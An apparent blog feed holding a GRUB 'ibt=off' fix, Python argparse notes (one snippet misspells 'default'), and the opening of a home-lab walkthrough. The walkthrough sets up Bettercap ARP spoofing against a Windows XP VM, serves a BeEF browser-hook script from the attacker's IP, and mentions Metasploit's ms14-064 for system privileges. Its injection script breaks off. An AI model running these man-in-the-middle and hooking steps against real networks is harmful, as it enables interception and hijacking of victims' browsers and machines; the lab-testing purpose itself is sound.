<p>Based on the content of the posts I&rsquo;ve read, the solution is to set the kernel parameter <code>ibt=off</code>.</p>
<blockquote>
<p>Thank you</p>
<p>appending</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ibt=off
</span></span></code></pre></td></tr></table>
</div>
</div><p>to kernel boot params fixed my problem.</p>
</blockquote>
<h2 id="how-do-i-set-kernel-boot-parameters">How do I set kernel boot parameters?</h2>
<p>Since I didn&rsquo;t know how to do this, I went to Google and found a method.</p>
<ul>
<li><a href="https://linuxconfig.org/how-to-set-kernel-boot-parameters-on-linux" target="_blank" rel="noopener noreffer">How to set kernel boot parameters on Linux - Linux Tutorials - Learn Linux Configuration</a></li>
</ul>
<h2 id="proposed-solution">Proposed Solution</h2>
<p>Actually, the solution is to edit the value of GRUB_CMDLINE_LINUX=&quot;&quot; in the /etc/default/grub file and add &ldquo;ibt=off&rdquo; to it.</p>
<h1 id="solution-steps">Solution Steps</h1>
<h2 id="1-edit-the-etcdefaultgrub-file">1. Edit the <code>/etc/default/grub</code> file</h2>
<p>The purpose of editing this file is to set the kernel boot parameters. The method for setting this may vary depending on the system booted by different bootloaders. As I am using Grub in my Arch system, I need to edit this file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo vim /etc/default/grub
</span></span></code></pre></td></tr></table>
</div>
</div><p>Find the keyword <code>GRUB_CMDLINE_LINUX=&quot;&quot;</code> and add the parameter <code>ibt=off</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># GRUB boot loader configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GRUB_DEFAULT=0
</span></span><span class="line"><span class="cl">GRUB_TIMEOUT=5
</span></span><span class="line"><span class="cl">GRUB_DISTRIBUTOR=&#34;Arch&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX_DEFAULT=&#34;loglevel=7&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX=&#34;ibt=off&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">......
</span></span></code></pre></td></tr></table>
</div>
</div><p>Enter <code>:</code> and type <code>wq</code> to save and exit the file (this is a basic operation and requires no further explanation).</p>
<h2 id="2-regenerate-the-grub-configuration-file">2. Regenerate the Grub configuration file</h2>
<p>Then, regenerate the Grub configuration file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>Wait for the operation to complete. If there are no errors, you can restart the operating system.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo reboot
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="testing-and-verification">Testing and Verification</h1>
<p>After restarting the system, open VirtualBox again and start a virtual machine. At this point, it should successfully enter the system.</p>
<p></p>
<p>This means that the problem has been solved.</p>
]]></description>
</item><item>
    <title>Python Learning Notes - ArgParse</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/</link>
    <pubDate>Sun, 16 May 2021 18:21:05 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-05-16-18-25-46%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be.png" referrerpolicy="no-referrer">
            </div><h1 id="introduction">Introduction</h1>
<p>In order to make <a href="https://github.com/WeepingDogel/TitleGetter" target="_blank" rel="noopener noreffer">TitleGetter</a>  more flexible, I plan to let users customize <code>list.txt</code> and the output file. Therefore, this requires the use of command line options&hellip; just like some software we commonly use, such as <code>pacman</code>.</p>
<p></p>
<p>So I googled it and learned about <a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">ArgParse</a>.</p>
<blockquote>
<p>The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments.</p>
<p>From: <a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></p>
</blockquote>
<p>Then I tried typing a file&hellip;</p>
<p>The result of running it looks like this:</p>
<p></p>
<p>So let&rsquo;s organize some related notes&hellip;</p>
<h1 id="creating-parser--adding-options">Creating Parser &amp;&amp; Adding Options</h1>
<p>Before everything starts, we need to use the <code>ArgumentParser</code> usage in the <code>argparse</code> library to create a variable named <code>parser</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is a parameter <code>description=''</code> here, which is used for writing some explanations&hellip;</p>
<p>For example, we wrote:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>By the way, we need to write down some necessary options~</p>
<p><code>parser.add_argument()</code> can be used here.</p>
<p>We need to add some things inside, such as the usage format of options like <code>-a</code> and <code>--about</code>.</p>
<p>Finally, add <code>args = parser.parse_args()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Show the about&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At this point, we can add <code>-h</code> to see the effect.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ python a.py -h
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">usage: a.py [-h] [-a ABOUT]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">optional arguments:
</span></span><span class="line"><span class="cl">  -h, --help            show this help message and exit
</span></span><span class="line"><span class="cl">  -a ABOUT, --about ABOUT
</span></span><span class="line"><span class="cl">                        Show the about
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then let&rsquo;s organize a few commonly used parameters.</p>
<ol>
<li><code>default</code>
*
The default value when no parameters are set.
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Show the about&#39;</span><span class="p">,</span> <span class="n">defualt</span><span class="o">=</span><span class="s1">&#39;text.txt&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>If the user does not set this parameter, a default one will be provided automatically.</li>
</ul>
</li>
<li><code>help</code>
<ul>
<li>Add explanatory text to the corresponding option.</li>
</ul>
</li>
<li>required
<ul>
<li>Used to determine whether this parameter must be set.</li>
<li>If <code>required=True</code> is set, an error will be reported if this parameter is not set at runtime.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ python a.py   
</span></span><span class="line"><span class="cl">usage: a.py [-h] -a ABOUT
</span></span><span class="line"><span class="cl">a.py: error: the following arguments are required: -a/--about
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<h1 id="calling-the-obtained-option-parameters">Calling the Obtained Option Parameters</h1>
<p>Next, we need to use the obtained parameters.</p>
<p>We know that when something is written after an option on the command line, the program will get it as a string by default. Then we have to use this to do what we want.</p>
<p>I wrote a simple script that can write the contents of one file to another file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;                                                            
</span></span></span><span class="line"><span class="cl"><span class="s1">By WeepingDogel
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">GetParser</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Help&#39;</span><span class="p">,</span> <span class="n">epilog</span><span class="o">=</span><span class="s1">&#39;A new testing program.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span><span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file&#39;</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;test.txt&#39;</span> <span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span><span class="s1">&#39;--read&#39;</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s1">&#39;read a file&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parser</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Write</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s1">&#39; has been written&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Read</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">GetParser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">Write</span><span class="p">(</span><span class="n">Read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">read</span><span class="p">),</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It is easy to see that what we obtain will go into the variable <code>args</code>, because <strong>it is assigned from the content returned by the function <code>parser.parse_args()</code>. To get the corresponding value of an option parameter, you can access it using <code>args.option_name</code>.</strong></p>
<p>For example, if we want to get the written file name:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ vim b.py
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Help&#39;</span><span class="p">,</span> <span class="n">epilog</span><span class="o">=</span><span class="s1">&#39;A new testing program.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span><span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file&#39;</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;test.txt&#39;</span> <span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">output</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The filename is &#34;</span><span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ python b.py -o WeepingDogel
</span></span><span class="line"><span class="cl">The filename is WeepingDogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, we have obtained the string &ldquo;WeepingDogel&rdquo;.</p>
<p>Similarly, the file name to be read is the same:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">args</span><span class="o">.</span><span class="n">read</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>That&rsquo;s all you need to do ～</p>
<p>Next, let&rsquo;s take a screenshot of the effect of the above code:
</p>
<p>Creating and using it is that simple&hellip;</p>
<p>Of course, there are more usages to explore&hellip;</p>
<h1 id="conclusion">Conclusion</h1>
<p>So what I&rsquo;m going to do next is to update these into <a href="https://github.com/WeepingDogel/TitleGetter" target="_blank" rel="noopener noreffer">TitleGetter</a> 啦！</p>
<p>There is no need to set the location of <code>list.txt</code> in the configuration file anymore! The output file position does not need to be fixed either!!</p>
<hr>
<h1 id="reference-links">Reference links</h1>
<ul>
<li><a href="https://vra.github.io/2017/12/02/argparse-usage/" target="_blank" rel="noopener noreffer">argparse简要用法总结 | Yunfeng&rsquo;s Simple Blog</a></li>
<li><a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></li>
</ul>
]]></description>
</item><item>
    <title>LAN Penetration Testing with Beef, Bettercap, and Other Tools</title>
    <link>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
    <pubDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-02-02_13-51.png" referrerpolicy="no-referrer">
            </div><h2 id="introduction">Introduction</h2>
<p>Well&hellip; Let&rsquo;s start with some rambling as usual&hellip;</p>
<p>Today, I tried using Beef and Bettercap together and found them to be quite effective~</p>
<p>Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~</p>
<p>Without further ado, let&rsquo;s get started~</p>
<h3 id="testing-environment">Testing Environment</h3>
<p>First, let&rsquo;s talk about the testing environment.</p>
<ul>
<li>
<p>Attacker machine</p>
<ul>
<li>Arch Linux</li>
<li>192.168.101.15</li>
</ul>
</li>
<li>
<p>Target machine</p>
<ul>
<li>Windows XP on VirtualBox</li>
<li>192.168.101.43</li>
</ul>
</li>
</ul>
<p>Due to limited resources, we can only use Windows XP for this demonstration~</p>
<h3 id="tools-used">Tools Used</h3>
<ol>
<li>Bettercap
<ul>
<li>First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks&hellip;</li>
</ul>
</li>
<li>Beef
<ul>
<li>Used for browser hijacking&hellip; and it can do many things, but I don&rsquo;t know the specifics.</li>
</ul>
</li>
<li>Metasploit (msf)
<ul>
<li>Our old friend~</li>
</ul>
</li>
</ol>
<h2 id="testing-process">Testing Process</h2>
<p>First, let&rsquo;s open <code>bettercap</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we will see the following output..</p>
<p></p>
<p><strong>Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don&rsquo;t use sudo, you will see a prompt like this.</strong></p>
<p></p>
<p>Next, set the target for ARP spoofing:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Here, the targets are set to the IP address of the target machine.</strong></p>
<p>Next, start Beef, and remember to use <code>sudo</code> as mentioned earlier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
</span></span></code></pre></td></tr></table>
</div>
</div><p>The output should be like this:</p>
<p></p>
<p>Now, let&rsquo;s talk about the links displayed in the terminal:</p>
<ul>
<li>Hook URL:  <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
<ul>
<li>This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~
Later, we will write it into an attack script~</li>
</ul>
</li>
<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/ui/panel</a>
<ul>
<li>This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this.</li>
</ul>
</li>
</ul>
<p></p>
<p>About the username and password, here&rsquo;s the thing: In some systems, you can&rsquo;t use the default login credentials <code>(beef:beef)</code> for Beef, and it may not even start. For example, this is the case with my Arch Linux.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
</span></span></code></pre></td></tr></table>
</div>
</div><p>In such cases, what you need to do is modify the <code>config.yaml</code> file. In my case, the file is located at <code>/usr/share/beef/config.yaml</code>.</p>
<p>Modify it as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;Choose a username&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Think of a password&#34;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>After that, you can start the system, and the username and password you set will be used for login.</p>
<p>Alright, without further ado, let&rsquo;s continue.</p>
<p>Next, we need to write a JavaScript script to use with Bettercap.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
